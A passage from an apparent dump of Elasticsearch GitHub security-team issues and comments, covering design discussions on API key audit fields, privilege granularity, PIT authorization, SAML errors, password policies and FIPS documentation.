2. We set the realm name `""_es_api_key""`, but dont return the original realm name so the original principal might be ambiguous (enchantress@dc and enchantress@marvel are different users, so enchantress@_es_api_key is abiguous).
3. We audit role names, but they are not meaningful in an API key scenario (when we have specific privileges in use)
4. We don't record the authentication type, so you need to imply the type from the realm name

","Pinging @elastic/es-security (:Security/Audit)I haven't marked this `team-discuss` because I think we should just sort it out, and most of it is straight forward.

The roles vs privileges issue is a tricky one that will need some thought, but adding new fields for API key info & authentication type isn't controversial.
After some digging, my plan for audit improvements for API Key authentication is to 

1) modify the `access_granted`, `access_denied` and `authentication_success` audit record types, as follows:
- add new `apikey.id` and `apikey.name` audit entry fields
- add a new `authentication.type` audit entry field with values such as token/realm/api_key
- remove the `user.roles` field as it currently contains a synthetic role name that is not informative of anything (except for the `authentication_success` event type, which does not contain this field)
- change the value of the `user.realm` field to reflect the realm of the user that created the API Key, instead of the current synthetic value of `_es_api_key` which is again not informative

I believe not maintaining values for the realm name and roles in the audit log _might_ break some downstream tooling, but these values should not be part of the output interface that we maintain because often they expose internals, which are flickery,  such as action and request type names, or, as in this case, hardcoded bogus names. They should've never been exposed in the first place.

2) make the authentication process generate an `authentication_failed` event when API Key authentication fails (~it currently silently falls through to realm authentication~ currently audit does not record api key authn failures). The fields would be the same as those from `authentication_success`, minus `apikey.name` and `user.realm` when they're not available because the API key does not exist.

Auditing of API Key Create, Update and Delete operations will be handled under a separate effort to audit Security changes in general.Another possible change, that I don't plan on implementing but that I want to raise up for discussion, is whether we should change the `user.name` field (and also `user.realm`) to something like `owner.name`, or even remove the field altogether, when authn is performed via API Keys.

The owner provides the baseline of privileges for a given API Key, and, in a sense, API Keys are used to delegate access to the owner resources'.

Eventually, the `apikey.id` field could be used to reference the audit event of the API Key creation (which will be added at a later time), providing all the informations about the API Key, including the owner user (in addition to the creator user, expiration and limiting privileges).

To summarise, I see 3 options for how to treat the owner of the API Key used for authn:

1. keep the existing `user.name` field (that's used for realm authn) to designate the owner of the API Key
2. remove the `user.name` field altogether, relying on the new `apikey.id` field to reference the (to-be-added) audit event for API Key creation (which includes the owner information)
3. remove the `user.name` field and introduce another field, `owner.name`.

I favour the first option because I _feel_ that API Key authentications are conceptually ascribed to the user that created the key. I don't have strong arguments, it's just a feeling based on the use cases where users create API Keys for services that must run under the user context to access user's resources.

Does anyone from @elastic/es-security or @bytebilly have other thoughts on this matter?Technically, if API Key creation is audited comprehensively, a simple API key ID should suffice the tracibility requirement. But I understand there are some arguments in favor of having user information in later logs, especially it provides more information when you glance through the logs. If certain users do not understand how API key works, the information could be confusing but they are argubly ""more"". 

In terms of semantic accuracy, I do think `owner.name` is better. However, I am concerned that this would break existing log analysis toolings that users may already have. Also this could lead to discussions on what are qualified as `owner`. Should we rename it for token authentication as well? Even the serialised auth header could be considered as ""owned"" by an user. 

Therefore, I do think **option 1 is better** in practice. It could use help of improved documentation to clarify that its precise semantics depends on other fields (e.g. whether `apikey.id` exists). Improvement on documentation is needed regardlessly, e.g. `owner.name` also needs to be documented to clarify its exact meaning, so it is _not_ a downside.I agree with option 1, for similar reasons.

_If_ we were introducing entirely new audit events for API Key authentication, I would probably favour `owner.name` over `user.name`, but it would be a weak preference.

However, since we're not creating separate events (and I don't think we should), I think the consistency of a single field is preferable.
1. Existing tooling expects `user.name` to always be there. Changing that seems like unnecessary churn.
2. If an audit log processor is not aware of API Keys, then they will get some useful information from the `user.name` field. It's not perfect, but it's something meaningful on which to base an audit investigation.
3. If the entries are being ingested into a ES index, then I feel like a single field is preferable. It improves the lucene performance (no sparse fields) and also makes it possible to do useful aggregations.
4. For use cases like Kibana alerting where the API Key really is acting on behalf of the owner, the above points become more significant. There will be clusters whether the only use of API Keys are for alerting, and in those cases you can ignore the `apikey.id` for 99% of cases and just rely on `user.name` as a consistent pointer to _Who did this?_ without caring (at least initially) with the _How?_ question.Agreed with the general approach and +1 on option 1 in your open question Albert. 

Even if we didn't do that, I think that since we are using both access tokens and api keys as bearer tokens, `owner` would also be semantically vague so I'd still favor `user`.

> The fields would be the same as those from authentication_success, minus apikey.name and user.realm when they're not available because the API key does not exist.

I think this is what you meant too, but just checking, the fields would be missing both when the apikey with that id doesn't exist and when the api key password was incorrect , right? @albertzaharovits When you have a chance, can you update this issue with a list of what's still outstanding? #58928 covered most of it, and I'm not sure if we can close this, or if we think there's more to do.@tvernum I've double checked and I believe that the only thing still left for API key auditing are authentication failures.

Currently, if API Key authentication fails, for any reason, the authentication flow follows through the realm chain. If none of the realms succeed, which is what happens if the request only contains the API Key credentials header, the authentication fails as if no credentials are present. In this case an anonymous access denied audit event is emitted, eg:
```
{""type"":""audit"", ""timestamp"":""2020-09-29T12:08:43,228+0300"", ""node.id"":""U2LDsAJVQfqCFZlVLe1rjQ"", ""event.type"":""rest"", ""event.action"":""anonymous_access_denied"", ""origin.type"":""rest"", ""origin.address"":""[::1]:57670"", ""url.path"":""/index-b1/_doc/2"", ""url.query"":""pretty"", ""request.method"":""PUT"", ""request.id"":""dgYxFOu6TQun9KIrm6QwDQ""}
```

This behaviour is similar to that of bearer tokens, but, comparatively, those are verified more stringently. For API Key authentication, format/decoding errors are interpreted as _authn unsuccessful_ errors.

My proposal is to audit such failures similarly to how we audit the realm authentication failures, but to also have these emitted by default (unlike realm authentication failures).

I'll add the `team-discuss` label to get a check on the approach. We've discussed this and agreed that authentication failure events should be emitted when API key and tokens verification fails (before authn falls through to realms).",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,608074060,"Consistent response for has privileges API when requesting undefined privileges","The [has privileges](https://www.elastic.co/guide/en/elasticsearch/reference/master/security-api-has-privileges.html#security-api-has-privileges-example) API currently gives back inconsistent responses when querying against undefined application privileges.

Though it could be argued that undefined behaviour is reasonable for undefined privileges, we would prefer to have consistency whenever possible. A few guidelines would be:

* When user has the match all permission, either directly via `*` or a `all` privilege defined as `actions: [""*""]`, we should return `true` regardless whether the queried privilege exists or not.
* Otherwise, we return `false` for undefined privileges
* Ensure the same response is returned for the same privileges regardless of how the query is constructed or any other unrelated information.
* If there is any other case that does not fit above situation, we prefer to return `false`.

Here is an example of the current inconsistency. Assuming we have the following application privileges:
```yaml
app-1:
  read:
    actions: [""a:b:c""]
  write:
    actions: [""x:y:z""]
```

When the user role is defined as:
```yaml
applications: 
  - application: ""app-1""
    privileges: [""read"", ""check""]
    resources: [""foo""]
```

The has privileges call for `app-1` and `check` returns `false`.

However, when the user role is defined as:
```yaml
applications:
  - application: ""app-1""
    privileges: [""check""]
    resources: [""foo""]
```
The same call returns `true`. The reason is that we check equality before empty:
https://github.com/elastic/elasticsearch/blob/f8413eb07ae200fc49732f2343008affdc93ac62/x-pack/plugin/core/src/main/java/org/elasticsearch/xpack/core/security/authz/permission/ApplicationPermission.java#L179-L190","Pinging @elastic/es-security (:Security/Authorization)",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317447951,"Update docs with how to clear all caches with * and also document the default naming of the native and file realmsrealm","*Original comment by @geekpete:*

The native security realm is called ""default_native"" by default which is not documented in our main docs anywhere: 
https://www.elastic.co/search?q=default_native&section=Learn%2FDocs%2FElasticsearch%2FReference%2F5.5

Also add a tip on how to clear all caches ""just to be sure"" via:
`POST _xpack/security/realm/*/_clear_cache`

This could be added to both of these user cache clearing related pages (and any other pages relevant to this process that I might have missed):
https://www.elastic.co/guide/en/x-pack/5.5/controlling-user-cache.html
and
https://www.elastic.co/guide/en/elasticsearch/reference/5.5/security-api-clear-cache.html","[docs issue triage]",no,">docs,:Security/Authentication,Team:Security,"
elastic/elasticsearch,415537641,"Implement retries wherever applicable in TokenService","We currently do not retry for `TransportActions#isShardNotAvailableException` everywhere in the TokenService implementation. We should go through the remaining places and ensure that we implement retries, or document why we shouldn't. 
","Pinging @elastic/es-securityHi there! Newcomer here, can i work on this?Pinging @elastic/es-security (Team:Security)",no,">refactoring,:Security/Authentication,Team:Security,v8.6.0,"
elastic/elasticsearch,317447128,"Validate queries within a role at creation time","*Original comment by @jaymode:*

To avoid issues like LINK REDACTED, we could possibly validate that the query in a role is valid prior to accepting the role. I think this would need to use something like the ValidateQueryAction. We will probably need to check if the role is templated and if so we will need to skip the validation.


","*Original comment by @skearns64:*

This is somewhat related to this other role validation issue: LINK REDACTED
",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,793492064,"Elasticsearch audit logging: Logging the query result","The need to log the results of a a query has come up a number of times, including in the context of alerting (see linked issue).

cc @bytebilly ","Pinging @elastic/es-core-infra (Team:Core/Infra)We currently don't have the ability to get the results related to the original request when writing the audit log entry.

However that would be helpful to track things like the API key ID when it's created (since it's automatically generated by the system and not provided as part of the request). This was discussed some time ago in the ES Security team.

cc @elastic/es-security I'm going to relabel this to the security team since it does not appear to involve logging infrastructure, but just the particular use by the security team with their audit log.@arisonl I had a quick chat with @tvernum about this.

We believe, the feature to audit responses doesn't fit squarely in the audit log that we've got; for example the audit log contains authentication failures.

The ES slowlog looks like a more suitable option. This log is more geared specifically for search operations, and it already prints the search queries. It's rather shard oriented, so ""responses"" might not be what is usually expected. Maybe someone from @elastic/es-search can comment about the feasibility of including responses in the slowlog, please? 

The slowlog lacks the user context, and this is something we could work on the security side, if this is something we need (but it's not clear if so, maybe you can confirm).@albertzaharovits thank you for your response. This request has come up in the context of alerting. Users would like to be able to go back and investigate the raw results returned by an alerting query. I only have a high level understanding of this ES feature, so if I understand correctly, if we were to go down this path, we would need to add this piece of context on top of the ability to record the results and in addition, users would have to piece together the results from the shards, perhaps using this context?",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,521216030,"Update documentation for built-in reporting_user role","Kibana Reporting uses its own authorization model where users need to be assigned a role contained in `xpack.reporting.roles.allow: []` (defaults to `reporting_user`). Current docs suggest the `reporting_user` role grants access to reporting indices, but that's not the case.
","Pinging @elastic/kibana-docs (Team:Docs)@n0othing could you provide some more context? The `xpack.reporting.roles.allow: []` setting on the [Reporting settings in Kibana](https://www.elastic.co/guide/en/kibana/current/reporting-settings-kb.html#reporting-advanced-settings) page doesn't specify anything about reporting indices. @KOTungseth sorry, I should I linked to the page I was referring to :) 

https://www.elastic.co/guide/en/elasticsearch/reference/current/built-in-roles.html

> Grants the specific privileges required for users of X-Pack reporting other than those required to use Kibana. This role grants access to the reporting indices; each user has access to only their own reports. Reporting users should also be assigned the kibana_user role and a role that grants them access to the data that will be used to generate reports.@jrodewig could you help with this one? 

It looks like the `reporting_user` role definition on the [Built-in roles](https://www.elastic.co/guide/en/elasticsearch/reference/current/built-in-roles.html#built-in-roles) page is a bit misleading. 

Is there any way that we could make it more clear that the `reporting_user` role does not grant access to the Kibana reporting indices?Agree that this looks like an ES docs issue. I'll transfer this to the elastic/elasticsearch repo so our team can handle. Thanks @n0othing @KOTungseth.Pinging @elastic/es-security (:Security/Authorization)Pinging @elastic/es-docs (>docs)I think this was closed in error",no,">docs,:Security/Authorization,Team:Docs,Team:Security,"
elastic/elasticsearch,955133977,"Security for PITs","Point in time references are first opened, using a dedicated API, and after that they are used in the regular search API.
The ""create"" and ""use"" operations are hence separate API calls.
Both calls are authenticated and authorized independently.

The call that opens the PIT evaluates the original index expression in order to resolve wildcards and aliases to concrete indices. Given the concrete indices, it then opens searcher contexts on every shard, with a specified lifetime, beyond the request's lifetime. The shard search context ids are encoded and returned as the PIT reference. The shard search context ids are unguessable.

The issues
---------

When the PIT is subsequently used, authorization has access only to the list of concrete index names. It doesn't know about the original name expression the user issued when opening the PIT, or about its wildcard expansion in its specific authorization context at the time.
This becomes an issue when the user searching with the PIT has more permissions on the alias that was used to open the PIT than on the indices pointed to by the alias. The user might expect the permissions on the alias to be applied, because of the analogy with a regular non-PIT
search for the same index expression, but instead it is the permission on the concrete indices that takes effect.

More generally, the current behavior is even more confusing if we consider users sharing PITs. If user1 opens a PIT using an expression containing wildcards, the wildcards are naturally resolved to the indices and aliases in the security context of user1.
But if user2 then uses the same PIT for searches, the permissions (DLS and FLS) that apply are his own, yet the concrete index list is resolved when creating the PIT in the user1's authorization context.

Solutions to explore
----------

1. all the data that user1 can access at PIT creation time, possibly more than user2 would have access to when searching for '*' without a PIT
 2. get all the data that both user1, at PIT creation time, AND user2, at PIT search time, have access to together
 3. all the data that user2 can access
 4. authorize PIT searches with all the permissions of the aliases that point to the indices that are contained in the PIT, at search time for user2
 5. get an error if users share PITs in general (if two users get different PITs they won't be able to exchange and use them for searches)
 6. don't change how this works today: user1 expands the original indices expression to a set of shards and user2's permissions are applied on those shards
 7. prohibit granting permissions on aliases altogether



","Pinging @elastic/es-security (Team:Security)I am still unclear on why we can't prohibit granting permissions on aliases. That was the plan for 8.0 and I think it's ok to ask users to grant the same permission on aliases and indices in the meantime. It's not ideal since that is required for PIT only but datastreams handle this natively. Can you explain why we're reluctant to continue the path that we initiated when the deprecation was added ? I am afraid that we're shooting ourselves in the foot If we need to check all aliases each time we need to grant access to a specific index. We could add a special mapping for this use case but that feels too much for a feature that is more or less an abuse of the alias filter.

",no,">enhancement,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317449346,"Allow enforcing minimum password strength","*Original comment by @loekvangool:*

We should allow administrators to add more requirements to passwords. We now (5.0.0) enforce a minimum length of 6 (at least in UI), but many enterprises require more.

Taking inspiration from Wikipedia, we could support:
1. the use of both upper-case and lower-case letters (case sensitivity)
2. inclusion of one or more numerical digits
3. inclusion of special characters, such as @, #, $
4. prohibition of words found in a password blacklist
5. prohibition of words found in the user's personal information
6. prohibition of use of company name or an abbreviation
7. prohibition of passwords that match the format of calendar dates, license plate numbers, telephone numbers, or other common numbers

I'm proposing that out of these we at least add support for 1, 2, 3. Bonus kudos if we support LINK REDACTED, which basically means: if the password reaches a minimum length of, say, 20, drop the other rules.

","8. Force user to change password after first loginis there any due date for this?Is this coming (ever) for this security-conscious product from a security-savvy company?
The SSO Wall Of Shame still has elastic listed",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,317454654,"Meta: Adjust privilege levels in Security","*Original comment by @tvernum:*

The current set of pre-defined privileges is quite coarse and we have a number of open issues requesting that we look at changing that.

This is meta issue for trying to collect those in one place for tracking and evaluation.
 ","*Original comment by @tvernum:*

**index:manage**
- [x] force merge : https://github.com/elastic/elasticsearch/issues/29702
- [ ] manage_aliases, manage_templates and open_close_indices: https://github.com/elastic/elasticsearch/issues/29732
- [x] refresh / flush: https://github.com/elastic/elasticsearch/issues/29998

**cluster:manage**
 - [ ] snapshot / restore : https://github.com/elastic/elasticsearch/issues/29725
 - [ ] license: #29971 
 - [ ] scripts: #48476

**cluster:manage_security**
- [ ] user editing privileges : https://github.com/elastic/elasticsearch/issues/29932
- [ ] readonly security: https://github.com/elastic/elasticsearch/issues/29999

**cluster:pipeline**
- [ ] allow read & simulate without put: https://github.com/elastic/elasticsearch/issues/57586
*Original comment by @tvernum:*

/CC @bizybot *Original comment by @albertzaharovits:*

I wonder if we could could make the `cluster:admin/settings/update` privilege more fine grained.
Specifically, the privilege could be read/write for a namespace of settings, similar to the indices privilege.
Thoughts ?*Original comment by @tvernum:*

@albertzaharovits it sounds like you're talking about Object Level Security.*Original comment by @albertzaharovits:*

@tvernum kind of... A restricted version of it, where objects are setting keys. I have yet to internalize the OLS opus.
I am dreaming of a new type of privilege, for settings only.
I should probably go read the OLS manual.*Original comment by @jaymode:*

@albertzaharovits see LINK REDACTED*Original comment by @gmoskovicz:*

I love to see this coming back.*Original comment by @jaymode:*

> I love to see this coming back.

@gmoskovicz what's coming back? We're not talking about documenting action names and how to use them in roles as part of this issue.*Original comment by @gmoskovicz:*

In previous discussions my understanding was that we considered not exposing this any more. So removing the option to use them. With this additions, it seems to be that we are not removing them, regardless of not documenting action names. 

Although to be honest, i think documenting them might be a good option as well.*Original comment by @jaymode:*

> With this additions, it seems to be that we are not removing them, regardless of not documenting action names.

This issue is about adding more granular items like a `open_close_indices` privilege, which has nothing to do with action names in roles from a user facing perspective. Its not safe to assume this means we will not remove the ability to authorize at the action level in the future based on this issue.*Original comment by @gmoskovicz:*

I would encourage not to remove the action level authorizations. With x-pack security, i can say that a huge number of users are using it, and removing it unexpectedly will be a huge miss for them.

Also, the context of this issue seems to be related to redefine or add/change pre-defined privileges, which to me is completely related to the granular action names as they are used in the same context and configuration. While i understand your statement, from a user perspective, both are the same. *Original comment by @astefan:*

@jaymode I can, also, say for sure that some users do use the granular permissions. I know they are not documented _now_ but they were in the past and some ""re-used"" them somehow or, if they do have development background, can have a look inside x-pack decompiled code for example.

And, to be honest, I've heard of requests where they were asking questions about permissions that were only possible with the granular permissions.

If there are previous requests somewhere recorded to bring back the granular permissions (in the documentation of course), I'd `+100` to those requests.*Original comment by @jaymode:*

There have been requests to bring the action level privileges back (ie re-document all of them and how to use them) back but what is missing is understanding why action level privileges do not make sense for the future of elasticsearch. Today we authorize at the action level but the majority of users do not know about actions nor should they; they think of elasticsearch in terms of APIs and the future will be rest only from a client perspective. 

There is no 1:1 mapping for rest to action privileges. Go back and look at all the random issues people had with shield because they thought they had all the action privileges they needed but then used a different parameter in a request and things broke. This is *not* a good user experience.

From a mindset perspective, we need to move away from thinking that bringing back action level privileges will be the way to achieve granular permissions. Instead, we need to think about operations in elasticsearch and how users interact with it. So while some of the more granular privileges mentioned in this issue could map directly to an action, others will map to many different actions.*Original comment by @gmoskovicz:*

Thanks for your answer @jaymode !

> There have been requests to bring the action level privileges back (ie re-document all of them and how to use them) back but what is missing is understanding why action level privileges do not make sense for the future of elasticsearch. Today we authorize at the action level but the majority of users do not know about actions nor should they; they think of elasticsearch in terms of APIs and the future will be rest only from a client perspective.

I think that until all the use cases, and the options to define privileges without actions, aren't included in a way that it is flexible enough to make sure you can define any set of specific user roles with specific actions, documenting the granular actions is a good idea. Even if we deprecate them in the future to finally remove them when we have all options available.

> There is no 1:1 mapping for rest to action privileges. Go back and look at all the random issues people had with shield because they thought they had all the action privileges they needed but then used a different parameter in a request and things broke. This is not a good user experience.

Correct, although right now the only option to achieve some specific user roles is to (unfortunately) use action level privileges.

> From a mindset perspective, we need to move away from thinking that bringing back action level privileges will be the way to achieve granular permissions. Instead, we need to think about operations in elasticsearch and how users interact with it. So while some of the more granular privileges mentioned in this issue could map directly to an action, others will map to many different actions.

In this, i completely agree. But before we are there, we need to provide both options. The action level privileges will allow advanced use cases that requires in depth knowledge of how these things work, while the API privileges or group of actions bundled inside a privilege will allow anyone to start using security.

Once we evolve, we could deprecate/remove the action levels, to just provide the group of actions.*Original comment by @jaymode:*

> Correct, although right now the only option to achieve some specific user roles is to (unfortunately) use action level privileges.

Can we make sure the team is aware of these roles that require action level privileges? If we know those, then it helps us complete the work for this issue.*Original comment by @astefan:*

One example: LINK REDACTED*Original comment by @jaymode:*

@costin also raised that our current SQL documentation defines an example role using action level privileges for two things. The first is accessing the `/` rest endpoint and the second is a call to get index.

```yaml
cli_or_jdbc_minimal:
  cluster:
    - ""cluster:monitor/main""
  indices:
    - names: test
      privileges: [read, ""indices:admin/get""]
    - names: bort
      privileges: [read, ""indices:admin/get""]
```",no,"Meta,:Security/Authorization,Team:Security,"
elastic/elasticsearch,317448756,"[SAML] Custom response for valid SAMLResponse but no request id provided","*Original comment by @jaymode:*

In order to provide a better experience for users of SAML authentication with Kibana, the Kibana team is asking for a custom response for the case when Elasticsearch receives a valid `SAMLResponse` that has a non-empty `in-response-to` value but no valid request ids were provided to Elasticsearch.

This scenario can happen when a user opens Kibana, gets redirected to the IdP and then waits enough time to login such that the Kibana session has expired before the user logs in at the IdP. The custom response from Elasticsearch would allow Kibana to reinitiate SAML authentication with a known request id and avoid displaying an error page to the user.

I took a look into this and I think we've made some design decisions in the authentication service that make this more difficult. However, I think we can support the ability to add a field on the AuthenticationResult that accepts headers that will be used for the unsuccessful authentication response. Using this, we can add our own header to indicate this special case. @tvernum what do you think?

cc @azasypkin ","*Original comment by @tvernum:*

The difficulty is that if you have multiple SAML realms, they're all going to reject the token for potentially different reasons and we'd need to have a way to surface the most useful error message, and I don't think it's always obvious which message is the ""real"" problem.

Strictly speaking, Kibana knows which realm its trying to login to, as it knows the ACS that was used, but we don't pass that to the `authenticate` end point.

I think there's a solution we could come up with, but I don't think it's a blocker.

@azasypkin Is there are reason why you can't retry whenever the kibana request-id cookie was empty? That is, if what looked like an IDP-initiated login failed, try a SP-initiated login instead.
*Original comment by @tvernum:*

Additionally, I think if we want to do this, we should do it properly and encode the various possible errors into some ""status"" indicator, at a rough first stab they'd be something like:

- PARSING
- IN_RESPONSE_TO
- SAML_STATUS
- WRONG_RECIPIENT
- WRONG_ISSUER
- SIGNATURE
- NO_ATTRIBUTES
- MULTIPLE_ASSERTIONS
- CANNOT_DECRYPT
- OUT_OF_DATE

We could then add a header that included each of the realm's error codes, something like:

```
X-Elasticsearch-SAML-Error: realm=saml1; error=WRONG_RECIPIENT, realm=saml2; error=OUT_OF_DATE
```

I don't love it though, so I'd prefer not to have to go down that path.*Original comment by @azasypkin:*

> @azasypkin Is there are reason why you can't retry whenever the kibana request-id cookie was empty? That is, if what looked like an IDP-initiated login failed, try a SP-initiated login instead.

Sure, we can and we'll likely do this if there is no better alternative. The idea was to have less blind guesses in Kibana and fall back based on well defined errors returned by Elasticsearch. 

Another minor concern is that users/we may never notice subtle bugs in the way IdP initiated login is handled by Elastic Stack or configured by IdP if we _always_ fall back to SP initiated login under the hood. Sure this will be reflected in Elasticsearch/Kibana logs, but still...

/cc @kobelb  @azasypkin Is this issue still relevant? Would you like us to look at it again?
Now that Kibana knows the actual realm to use we can probably give a better response.> @azasypkin Is this issue still relevant? Would you like us to look at it again?
> Now that Kibana knows the actual realm to use we can probably give a better response.

Yeah, I think it's still relevant and would allow us to be more confident in falling back to SP initiated login if we have only one SAML provider configured (we don't do this right now and haven't heard complaints though). 

Although not strictly related to this issue, but there is another case when it'd be great to have a dedicated error code/status is when Kibana sends SAMLResponse **with** the realm name, and these don't match. Context: Kibana SAML support is implemented in such a way that we create separate SAML authentication provider for every configured SAML realm (+ a bunch of other provider specific additional settings, e.g. whether or not specific provider should process `RelayState` as a redirect URL), and when we handle SAML IdP initiated login we want only correct provider to handle that login attempt. But since we don't have a way to figure out the correct SAML provider we loop through all of them and try to login with provider specific realm and received SAMLResponse until we succeed. Ideally we should move on to the next provider only if login fails because of realm mismatch, but now we do this for every error returned from `saml/authenticate`.

To summarize: having easily distinguishable error codes for these cases would be nice to have, but these don't sound like blockers.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,620170127,"Investigate removing dependency to SUN Security Provider","We have an implicit dependency to the SUN Security Provider because of how we are reading and parsing the system policy and the policy of plugins. 
https://github.com/elastic/elasticsearch/blob/master/server/src/main/java/org/elasticsearch/bootstrap/Security.java#L236

The [`JavaPolicy` policy type](https://docs.oracle.com/en/java/javase/11/docs/specs/security/standard-names.html#policy-types) that we are using corresponds to the default Policy implementation that is provided by the SUN Provider. What's more, other Security Providers don't seem to offer an alternative policy implementation. 

Up until Java 8, even when in FIPS mode , the SunJSSE provider depended on the SUN security provider, so it was necessary to leave it in the Security Provider configuration. Now, since JDK11 , especially with our move to BCJSSE as a FIPS approved JSSE provider, that requirement is not present any more and we can look into removing the dependency ( i.e. allow elasticsearch to run in a JVM where `security.provider.n=SUN` is not in the configured provider chain ). 

The reason why we would want to do something like this, is that we want to be as diligent as possible with regards to what cryptographic algorithm implementations are available in runtime when in FIPS mode. Removing other security providers from the provider list would help our users be certain that even if an algorithm that is not FIPS 140 approved is attempted to be used, there will be no available implementation for it in the list of the loaded security providers. 

A couple of ideas from the top of my head: 

- Dynamically remove the SUN provider after we load the Policy as necessary (`java.security.Security#removeProvider`) when in FIPS mode
- Offer our own implementation and type of Policy. ","Pinging @elastic/es-security (:Security/Security)Pinging @elastic/es-core-infra (:Core/Infra/Core)",no,">enhancement,high hanging fruit,:Core/Infra/Core,:Security/Security,Team:Core/Infra,Team:Security,"
elastic/elasticsearch,433054344,"Enhance Security Model for CCS/CCR","The security model for CCS & CCR is largely based on having a single security domain that extends across the 2 (or more) clusters.

This means for authentication:
- Users are authenticated once on the node they first connect to
- Role _names_ are resolved during authentication
- Role _definitions_ are resolved at point of execution (on remote nodes)

And for network security:
- All operations are performed over the standard transport port, and the clusters need to trust each one-another's certificates (i.e. use a shared CA, or list multiple CAs). 

We would like to give the target clusters (those operating as ""remote"" clusters in CCS/CCR terminology) more control over who can connect, using which roles, and what actions may be performed.","Pinging @elastic/es-securityOne item that we haven't captured anywhere but have discussed in the past and is relevant here is the use of an API key for something like CCR. When following an index, an API key would be created and registered for use rather than re-using a user's context.Another issue with the current CCS security model is that the local `elastic` user has `all` privileges on all remote clusters as well as their own.
@derickson @tris325 ",no,":Security/Security,Team:Security,"
elastic/elasticsearch,614100076,"Remove `manage_ingest_pipelines` privilege from documentation and get builitin privileges API ","`manage_ingest_pipelines` is a duplicate of `manage_pipeline`. While it is not easy to deprecate and remove this at this point, we should aim to lessen the confusion and prohibit additional usages of it by

- Remove this from the documentation
- Remove this from the response of [Get builtin privileges API](https://www.elastic.co/guide/en/elasticsearch/reference/7.6/security-api-get-builtin-privileges.html)","Pinging @elastic/es-security (:Security/Authorization)Pinging @elastic/es-docs (>docs)I can't recall how Kibana behaves if we remove a privilege from the built-in privileges API. We may need to co-ordinate the change with @elastic/kibana-security and consider having a `deprecated` field in the response.I'm in favor of adding a deprecated field in the response -- we can update Kibana to take advantage of this like we did for users and roles.

That being said, it shouldn't be a problem to remove this from the API. Kibana only uses this to power the dropdown of available options. We allow users to specify their own as well though, so they're not constrained by what you return here. If you view a role with an option that doesn't exist anymore, it will still show up in the UI, but there won't be any indication that it's invalid.",no,">docs,>deprecation,:Security/Authorization,Team:Security,"
elastic/elasticsearch,811826284,"Enhance OIDC realm logging","There are certain aspects where the logging we provide in DEBUG and TRACE level in the OIDC realm is not sufficient for troubleshooting, especially when we cannot get logs from OpenID Providers. The following is a non comprehensive list: 

- TRACE logs for all our backchannel outgoing requests to the OP token and userinfo endpoints
- TRACE logs for all the incoming responses before we attempt to validate them ( as failures might cause us to throw before/without logging in certain scenarios)","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,394465261,"Improve documentation for FIPS 140-2","**Describe the feature**:

Our [FIPS 140-2 documentation](https://www.elastic.co/guide/en/elasticsearch/reference/current/fips-140-compliance.html) doesn't have any instructions on how to setup Java for FIPS 140-2. And from other sources doesn't seem to be that well documented either (at least I found them confusing). From what I can tell there's two possible ways to do that. Either using SunPKCS11 with NSS or BouncyCastle. However from our documentation its not clear as to which is supported/preferred/tested. Also how one would go about creating a supported keystore/trustore. As from what I have read to do so using the `keytool` command requires some additional parameters like `-providerClass` and `-storeType`. So it would be useful to have a step-by-step guide to configuring OpenJDK/OracleJDK to setting up FIPS 140-2, creating keystore/truststore or using PEM. 

Also one possible alternative, to using two Java installations for using `elasticsearch-plugin` or `elasticsearch-certutil` is to use:

`ES_JAVA_OPTS=""-Djava.security.properties=/path/to/java.security"" elasticsearch-plugin install <plugin-name>`

By specifying an alternate java.security without the FIPS 140-2 configuration. Which maybe easier for end users then setting up an entire separate JAVA and using a different JAVA_HOME. 

**Elasticsearch version** (`bin/elasticsearch --version`):

Elasticsearch 6.5.2

**Plugins installed**: []

**JVM version** (`java -version`):

OpenJDK 1.8

**OS version** (`uname -a` if on a Unix-like system):

Any

","Pinging @elastic/es-securityThe decision to not cover the FIPS 140-2 setup in the documentation was a conscious one. We believed that the process is complicated enough to be laid out in our documentation and that users that would need to use Elasticsearch in a FIPS 140-2 environment would already have that environment in place and would be familiar with its intricacies. 

> Either using SunPKCS11 with NSS or BouncyCastle

Yes, that is correct. These are the 2 most widely used security provider implementations that offer a fips 140 mode. 

> Also one possible alternative, to using two Java installations for using elasticsearch-plugin or elasticsearch-certutil is to use:

> ES_JAVA_OPTS=""-Djava.security.properties=/path/to/java.security"" elasticsearch-plugin install <plugin-name>

> By specifying an alternate java.security without the FIPS 140-2 configuration. Which maybe easier for end users then setting up an entire separate JAVA and using a different JAVA_HOME.

True. The `(pointing JAVA_HOME environment variable to a different java installation) ` sentence was not meant to be the only or the definitive way to do so, just an example.

> However from our documentation its not clear as to which is supported/preferred/tested. 

I'll take it up to add a section about the limitations that are implied by using SunPCKS11-NSS (these are detailed in https://github.com/elastic/elasticsearch/issues/33459) to the docs. 

I'll defer the question to how much in detail we should go about documenting a FIPS 140-2 JVM setup to @jaymode and @joshbressers for some thoughts and guidance. I think we need some better documentation around this because as you mentioned the process is complicated. And I don't think we can assume that FIPS 140-2 is already setup or the end user is an expert in setting up FIPS 140-2 for Java. If the end user runs into a problem they can't compare their process with the steps we used to configure FIPS 140-2. [docs issue triage]",no,">docs,:Security/Security,Team:Security,"
elastic/elasticsearch,389826668,"Clean up security internal user handling","The security code uses the concept of internal users (eg XPackUser, XPackSecurityUser, SystemUser, etc) but doesn't have a central place where we keep track of these so there are places in the code where we miss handling these users properly. There have been two recent examples that I am aware of; the handling of the backwards compatible xpack user, #36199 and #36489, and the lack of treating the xpack security user as a system user for auditing, https://github.com/elastic/elasticsearch/pull/36245/commits/e267d3d55c64e68b0da0dd1b1af9a9225acf58c7.

@nik9000 started on consolidating this while working on removal of the system context, see https://github.com/nik9000/elasticsearch/commit/e0462992be5a549aae4f539dabde140c52e9106b ","Pinging @elastic/es-security",no,">bug,:Security/Authentication,Team:Security,"
elastic/elasticsearch,730107788,"Different error message for ignore_unavailable=true search","Tested this on master with the following `_search` URL `/inexistent/_search?allow_no_indices=false&ignore_unavailable=true` where `inexistent` is an index name that doesn't exist in the cluster.

